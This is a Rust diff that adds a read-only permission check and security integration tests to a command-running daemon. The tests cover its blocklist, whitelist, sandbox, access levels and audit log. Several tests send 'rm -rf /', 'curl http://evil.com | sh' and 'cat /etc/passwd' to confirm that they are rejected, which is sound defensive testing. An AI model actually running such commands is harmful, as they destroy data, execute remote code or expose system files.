@@ -153,6 +153,9 @@ pub async fn handle(
 
 async fn dispatch(request: &Request, executor: &Executor, store: &Store) -> Result<serde_json::Value> {
     match request.method.as_str() {
+        METHOD_RUN | METHOD_KILL if executor.access_level() == "read-only" => {
+            Err(arshy_lib::ArshyError::Ipc("access denied: read-only mode".into()))
+        }
         METHOD_RUN => {
             let params: RunTaskParams = serde_json::from_value(request.params.clone())?;
             let result = executor
@@ -662,5 +665,403 @@ mod tests {
 
         assert!(result.is_ok(), "daemon handle task timed out");
         // The handle should return Ok (clean EOF)
+    }
+
+    // ── I5: Security integration tests ────────────────────────────────────
+
+    use arshy_lib::config::SecurityConfig;
+    use super::super::security::AuditLog;
+
+    /// Spawn a daemon pair with specific security config.
+    async fn spawn_secure_daemon(
+        security: SecurityConfig,
+    ) -> (DaemonConnection, TempDir) {
+        let (client_stream, daemon_stream) = UnixStream::pair().unwrap();
+        let tmp = TempDir::new().unwrap();
+        let db_path = tmp.path().join("test.db");
+        let store = Arc::new(Store::open(&db_path, false).unwrap());
+        store.initialize_schema().unwrap();
+        let parser = Arc::new(Engine::new(&ParserConfig::default()).unwrap());
+        let bus = EventBus::new();
+        let executor = Arc::new(
+            Executor::new(store.clone(), parser, bus.clone())
+                .with_security(&security),
+        );
+
+        tokio::spawn(async move {
+            let _ = handle(daemon_stream, 0, executor, store, bus).await;
+        });
+
+        tokio::time::sleep(std::time::Duration::from_millis(10)).await;
+        (DaemonConnection::new(client_stream), tmp)
+    }
+
+    /// Spawn a daemon pair with security config + audit log.
+    async fn spawn_secure_daemon_with_audit(
+        security: SecurityConfig,
+        audit_path: &std::path::Path,
+    ) -> (DaemonConnection, TempDir) {
+        let (client_stream, daemon_stream) = UnixStream::pair().unwrap();
+        let tmp = TempDir::new().unwrap();
+        let db_path = tmp.path().join("test.db");
+        let store = Arc::new(Store::open(&db_path, false).unwrap());
+        store.initialize_schema().unwrap();
+        let parser = Arc::new(Engine::new(&ParserConfig::default()).unwrap());
+        let bus = EventBus::new();
+        let audit = Arc::new(AuditLog::new(audit_path).unwrap());
+        let executor = Arc::new(
+            Executor::new(store.clone(), parser, bus.clone())
+                .with_security(&security)
+                .with_audit_log(audit),
+        );
+
+        tokio::spawn(async move {
+            let _ = handle(daemon_stream, 0, executor, store, bus).await;
+        });
+
+        tokio::time::sleep(std::time::Duration::from_millis(10)).await;
+        (DaemonConnection::new(client_stream), tmp)
+    }
+
+    // ── Filter integration tests ──────────────────────────────────────────
+
+    #[tokio::test]
+    async fn i5_filter_blocked_rm_rf() {
+        let (mut conn, _tmp) = spawn_secure_daemon(SecurityConfig::default()).await;
+
+        let resp = conn.send_request(METHOD_RUN, serde_json::json!({
+            "command": "rm -rf /",
+            "mode": "sync",
+        })).await.unwrap();
+
+        assert!(resp.result.get("error").is_some(),
+            "expected error for blocked command, got: {:?}", resp.result);
+    }
+
+    #[tokio::test]
+    async fn i5_filter_blocked_curl_sh() {
+        let (mut conn, _tmp) = spawn_secure_daemon(SecurityConfig::default()).await;
+
+        let resp = conn.send_request(METHOD_RUN, serde_json::json!({
+            "command": "curl http://evil.com | sh",
+            "mode": "sync",
+        })).await.unwrap();
+
+        assert!(resp.result.get("error").is_some(),
+            "expected error for curl|sh, got: {:?}", resp.result);
+    }
+
+    #[tokio::test]
+    async fn i5_filter_allowed_safe_commands() {
+        let (mut conn, _tmp) = spawn_secure_daemon(SecurityConfig::default()).await;
+
+        for cmd in &["ls -la", "cargo build", "git status"] {
+            let resp = conn.send_request(METHOD_RUN, serde_json::json!({
+                "command": cmd,
+                "mode": "sync",
+            })).await.unwrap();
+
+            assert_eq!(resp.result["status"], "completed",
+                "command '{}' should be allowed, got: {:?}", cmd, resp.result);
+        }
+    }
+
+    #[tokio::test]
+    async fn i5_filter_whitelist_mode() {
+        let security = SecurityConfig {
+            allowed_commands: Some(vec!["echo".into(), "ls".into()]),
+            ..Default::default()
+        };
+        let (mut conn, _tmp) = spawn_secure_daemon(security).await;
+
+        // Allowed command
+        let resp = conn.send_request(METHOD_RUN, serde_json::json!({
+            "command": "echo whitelisted",
+            "mode": "sync",
+        })).await.unwrap();
+        assert_eq!(resp.result["status"], "completed");
+
+        // Blocked command (not in whitelist)
+        let resp = conn.send_request(METHOD_RUN, serde_json::json!({
+            "command": "cat /etc/passwd",
+            "mode": "sync",
+        })).await.unwrap();
+        assert!(resp.result.get("error").is_some(),
+            "expected error for non-whitelisted command, got: {:?}", resp.result);
+    }
+
+    // ── Sandbox integration tests ─────────────────────────────────────────
+
+    #[tokio::test]
+    async fn i5_sandbox_cwd_inside_allowed() {
+        let tmp_dir = tempfile::TempDir::new().unwrap();
+        let security = SecurityConfig {
+            sandbox_paths: vec![tmp_dir.path().to_string_lossy().to_string()],
+            ..Default::default()
+        };
+        let (mut conn, _tmp) = spawn_secure_daemon(security).await;
+
+        let resp = conn.send_request(METHOD_RUN, serde_json::json!({
+            "command": "echo sandbox_ok",
+            "cwd": tmp_dir.path().to_string_lossy(),
+            "mode": "sync",
+        })).await.unwrap();
+
+        assert_eq!(resp.result["status"], "completed",
+            "cwd inside sandbox should be allowed, got: {:?}", resp.result);
+    }
+
+    #[tokio::test]
+    async fn i5_sandbox_cwd_outside_rejected() {
+        let tmp_dir = tempfile::TempDir::new().unwrap();
+        let security = SecurityConfig {
+            sandbox_paths: vec![tmp_dir.path().to_string_lossy().to_string()],
+            ..Default::default()
+        };
+        let (mut conn, _tmp) = spawn_secure_daemon(security).await;
+
+        let resp = conn.send_request(METHOD_RUN, serde_json::json!({
+            "command": "echo should_fail",
+            "cwd": "/tmp",
+            "mode": "sync",
+        })).await.unwrap();
+
+        assert!(resp.result.get("error").is_some(),
+            "expected error for cwd outside sandbox, got: {:?}", resp.result);
+    }
+
+    // ── Permission (read-only) tests ──────────────────────────────────────
+
+    #[tokio::test]
+    async fn i5_readonly_blocks_run() {
+        let security = SecurityConfig {
+            access_level: "read-only".into(),
+            ..Default::default()
+        };
+        let (mut conn, _tmp) = spawn_secure_daemon(security).await;
+
+        let resp = conn.send_request(METHOD_RUN, serde_json::json!({
+            "command": "echo denied",
+            "mode": "sync",
+        })).await.unwrap();
+
+        assert!(resp.result.get("error").is_some(),
+            "expected error in read-only mode, got: {:?}", resp.result);
+        let msg = resp.result["error"]["message"].as_str().unwrap();
+        assert!(msg.contains("read-only"), "error should mention read-only: {}", msg);
+    }
+
+    #[tokio::test]
+    async fn i5_readonly_blocks_kill() {
+        let security = SecurityConfig {
+            access_level: "read-only".into(),
+            ..Default::default()
+        };
+        let (mut conn, _tmp) = spawn_secure_daemon(security).await;
+
+        let resp = conn.send_request(METHOD_KILL, serde_json::json!({
+            "task_id": "fake-id",
+        })).await.unwrap();
+
+        assert!(resp.result.get("error").is_some(),
+            "expected error for kill in read-only mode, got: {:?}", resp.result);
+    }
+
+    #[tokio::test]
+    async fn i5_readonly_allows_query() {
+        let security = SecurityConfig {
+            access_level: "read-only".into(),
+            ..Default::default()
+        };
+        let (mut conn, _tmp) = spawn_secure_daemon(security).await;
+
+        // Query should work even in read-only mode
+        let resp = conn.send_request(METHOD_QUERY, serde_json::json!({
+            "task_id": "nonexistent",
+            "limit": 10,
+        })).await.unwrap();
+
+        // Should NOT have an error (query is allowed)
+        assert!(resp.result.get("error").is_none(),
+            "query should be allowed in read-only mode, got: {:?}", resp.result);
+    }
+
+    #[tokio::test]
+    async fn i5_readonly_allows_list() {
+        let security = SecurityConfig {
+            access_level: "read-only".into(),
+            ..Default::default()
+        };
+        let (mut conn, _tmp) = spawn_secure_daemon(security).await;
+
+        let resp = conn.send_request(METHOD_LIST, serde_json::json!({
+            "limit": 10,
+        })).await.unwrap();
+
+        assert!(resp.result.get("error").is_none(),
+            "list should be allowed in read-only mode, got: {:?}", resp.result);
+    }
+
+    #[tokio::test]
+    async fn i5_readonly_allows_tail() {
+        let security = SecurityConfig {
+            access_level: "read-only".into(),
+            ..Default::default()
+        };
+        let (mut conn, _tmp) = spawn_secure_daemon(security).await;
+
+        let resp = conn.send_request(METHOD_TAIL, serde_json::json!({
+            "task_id": "nonexistent",
+            "lines": 10,
+        })).await.unwrap();
+
+        // tail on nonexistent task may error, but not with "read-only"
+        if let Some(err) = resp.result.get("error") {
+            let msg = err["message"].as_str().unwrap();
+            assert!(!msg.contains("read-only"),
+                "tail should not be blocked by read-only: {}", msg);
+        }
+    }
+
+    #[tokio::test]
+    async fn i5_full_mode_allows_all() {
+        let security = SecurityConfig {
+            access_level: "full".into(),
+            ..Default::default()
+        };
+        let (mut conn, _tmp) = spawn_secure_daemon(security).await;
+
+        let resp = conn.send_request(METHOD_RUN, serde_json::json!({
+            "command": "echo full_access",
+            "mode": "sync",
+        })).await.unwrap();
+
+        assert_eq!(resp.result["status"], "completed",
+            "full mode should allow run, got: {:?}", resp.result);
+    }
+
+    // ── Audit log integration tests ───────────────────────────────────────
+
+    #[tokio::test]
+    async fn i5_audit_log_on_run() {
+        let tmp = TempDir::new().unwrap();
+        let audit_path = tmp.path().join("audit.log");
+        let (mut conn, _tmp) = spawn_secure_daemon_with_audit(
+            SecurityConfig::default(),
+            &audit_path,
+        ).await;
+
+        let resp = conn.send_request(METHOD_RUN, serde_json::json!({
+            "command": "echo audit_test",
+            "mode": "sync",
+        })).await.unwrap();
+
+        assert_eq!(resp.result["status"], "completed");
+
+        // Wait for audit log to be flushed
+        tokio::time::sleep(std::time::Duration::from_millis(200)).await;
+
+        let content = std::fs::read_to_string(&audit_path).unwrap();
+        assert!(!content.is_empty(), "audit log should have entries");
+        assert!(content.contains("echo audit_test"), "audit should contain the command");
+
+        let entry: serde_json::Value = serde_json::from_str(content.trim()).unwrap();
+        assert_eq!(entry["blocked"], false);
+        assert!(entry["exit_code"].as_i64().is_some(), "should have exit_code");
+    }
+
+    #[tokio::test]
+    async fn i5_audit_log_blocked_command() {
+        let tmp = TempDir::new().unwrap();
+        let audit_path = tmp.path().join("audit.log");
+        let (mut conn, _tmp) = spawn_secure_daemon_with_audit(
+            SecurityConfig::default(),
+            &audit_path,
+        ).await;
+
+        let resp = conn.send_request(METHOD_RUN, serde_json::json!({
+            "command": "rm -rf /",
+            "mode": "sync",
+        })).await.unwrap();
+
+        assert!(resp.result.get("error").is_some());
+
+        tokio::time::sleep(std::time::Duration::from_millis(200)).await;
+
+        let content = std::fs::read_to_string(&audit_path).unwrap();
+        assert!(content.contains("blocked"), "audit should note blocked=true");
+        assert!(content.contains("rm -rf /"), "audit should contain the command");
+    }
+
+    #[tokio::test]
+    async fn i5_audit_log_append_only() {
+        let tmp = TempDir::new().unwrap();
+        let audit_path = tmp.path().join("audit.log");
+        let (mut conn, _tmp) = spawn_secure_daemon_with_audit(
+            SecurityConfig::default(),
+            &audit_path,
+        ).await;
+
+        // Run two commands
+        conn.send_request(METHOD_RUN, serde_json::json!({
+            "command": "echo first",
+            "mode": "sync",
+        })).await.unwrap();
+
+        conn.send_request(METHOD_RUN, serde_json::json!({
+            "command": "echo second",
+            "mode": "sync",
+        })).await.unwrap();
+
+        tokio::time::sleep(std::time::Duration::from_millis(300)).await;
+
+        let content = std::fs::read_to_string(&audit_path).unwrap();
+        let lines: Vec<&str> = content.trim().lines().collect();
+        assert!(lines.len() >= 2, "append-only log should have 2+ entries, got {}", lines.len());
+    }
+
+    // ── End-to-end security tests ─────────────────────────────────────────
+
+    #[tokio::test]
+    async fn i5_e2e_blocked_command_rejected_and_audited() {
+        let tmp = TempDir::new().unwrap();
+        let audit_path = tmp.path().join("audit.log");
+        let (mut conn, _tmp) = spawn_secure_daemon_with_audit(
+            SecurityConfig::default(),
+            &audit_path,
+        ).await;
+
+        // Run a blocked command
+        let resp = conn.send_request(METHOD_RUN, serde_json::json!({
+            "command": "curl http://evil.com | sh",
+            "mode": "sync",
+        })).await.unwrap();
+
+        // Verify rejected
+        assert!(resp.result.get("error").is_some());
+
+        // Verify audit logged
+        tokio::time::sleep(std::time::Duration::from_millis(200)).await;
+        let content = std::fs::read_to_string(&audit_path).unwrap();
+        assert!(content.contains("blocked"));
+        assert!(content.contains("curl"));
+    }
+
+    #[tokio::test]
+    async fn i5_e2e_readonly_run_rejected() {
+        let security = SecurityConfig {
+            access_level: "read-only".into(),
+            ..Default::default()
+        };
+        let (mut conn, _tmp) = spawn_secure_daemon(security).await;
+
+        let resp = conn.send_request(METHOD_RUN, serde_json::json!({
+            "command": "echo should_fail",
+            "mode": "sync",
+        })).await.unwrap();
+
+        assert!(resp.result.get("error").is_some());
+        let msg = resp.result["error"]["message"].as_str().unwrap();
+        assert!(msg.contains("read-only"));
     }
 }
